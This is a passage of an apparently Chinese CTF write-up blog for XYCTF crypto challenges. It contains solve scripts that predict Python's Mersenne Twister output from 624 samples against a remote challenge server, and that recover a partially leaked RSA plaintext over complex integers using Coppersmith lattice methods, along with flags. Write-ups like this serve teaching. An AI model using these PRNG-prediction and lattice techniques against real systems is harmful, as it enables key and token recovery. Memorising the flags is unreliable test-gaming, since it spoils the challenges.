class="string">&#x27;Invalid choice&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>MT19937</strong><strong></strong>1<strong>624</strong><code>rand1 rand2</code><code>flag</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;47.94.15.198&quot;</span>, <span class="number">20491</span>)</span><br><span class="line">rc = RandCrack()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">624</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    a = <span class="built_in">str</span>(p.recvline().decode()).split(<span class="string">&#x27; = &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    rc.submit(<span class="built_in">int</span>(a))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">rand1 = rc.predict_getrandbits(<span class="number">11000</span>)</span><br><span class="line">rand2 = rc.predict_getrandbits(<span class="number">10000</span>)</span><br><span class="line">ans = rand1 // rand2</span><br><span class="line">p.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Here is your flag: &#x27;</span>)</span><br><span class="line">flag = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-1364b443a5f502f55274afa666827bdd_1440w.png?source=d16d100b" alt="" /></p><h2 id="complex_signin"><a class="markdownIt-Anchor" href="#complex_signin"></a> Complex_signin</h2><blockquote><p>As everyone knows, a check-in challenge shouldnt look too much like a check-in. So, this is a simple partial m leakage in RSAbut then again, it doesnt seem like just a simple partial m leakage in RSA.</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, c</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re == c.re <span class="keyword">and</span> self.im == c.im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__rshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &gt;&gt; m, self.im &gt;&gt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lshift__</span>(<span class="params">self, m</span>):</span><br><span class="line">        <span class="keyword">return</span> Complex(self.re &lt;&lt; m, self.im &lt;&lt; m)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> <span class="keyword">if</span> self.im &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span>&#125;</span>i&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.im&#125;</span>i&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;self.re&#125;</span> <span class="subst">&#123;<span class="string">&#x27;+&#x27;</span> <span class="keyword">if</span> self.im &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;-&#x27;</span>&#125;</span> <span class="subst">&#123;<span class="built_in">abs</span>(self.im)&#125;</span>i&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">tolist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.re, self.im]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">bits = <span class="number">128</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">m = Complex(getRandomRange(<span class="number">1</span>, n), getRandomRange(<span class="number">1</span>, n))</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = complex_pow(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;mh = <span class="subst">&#123;(m &gt;&gt; bits &lt;&lt; bits).tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;C = <span class="subst">&#123;c.tolist()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m.re + m.im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).encrypt(flag)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span></span><br><span class="line"><span class="string">mh = [3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016, 15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552]</span></span><br><span class="line"><span class="string">C = [5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760, 21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752]</span></span><br><span class="line"><span class="string">enc = b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong></strong><strong></strong><a href="https://tangcuxiaojikuai.xyz/post/146254b2.html"></a><strong>copper</strong><strong></strong></p><p><code>bound</code><code>m</code><code>d</code></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>m</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo></mo><mi>i</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">C\equiv(m\_re+m\_im*i)^{3}\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9695199999999999em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>=</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">m\_re=mh\_re+x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.74056em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>=</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">m\_im=mh\_im+y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695199999999999em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00444em;vertical-align:-0.31em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mo></mo><mn>3</mn><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>y</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">C\_re\equiv(mh\_re+x)^{3}-3*(mh\_re+x)*(mh\_im+y)^{2}\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo></mo><mn>3</mn><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>r</mi><mi>e</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo><mo></mo><mo stretchy="false">(</mo><mi>m</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>i</mi><mi>m</mi><mo>+</mo><mi>x</mi><msup><mo stretchy="false">)</mo><mn>3</mn></msup><mi mathvariant="normal">%</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">C\_im\equiv3*(mh\_re+x)^{2}*(mh\_im+y)-(mh\_im+x)^{3}\%n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.99333em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">n</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">mh = </span><br><span class="line">C = </span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line">mh_re, mh_im = mh</span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mh_re + x)**<span class="number">3</span> - <span class="number">3</span>*(mh_re + x)*(mh_im + y)**<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>), m=<span class="number">2</span>, d=<span class="number">3</span>)</span><br><span class="line">m_re = mh_re + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">m_im = mh_im + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">flag = ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;</span></span><br></pre></td></tr></table></figure><h2 id="reed"><a class="markdownIt-Anchor" href="#reed"></a> reed</h2><blockquote><p>Ive invented a new random number generation algorithm, and I believe its secure enough to withstand all known attacks!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span 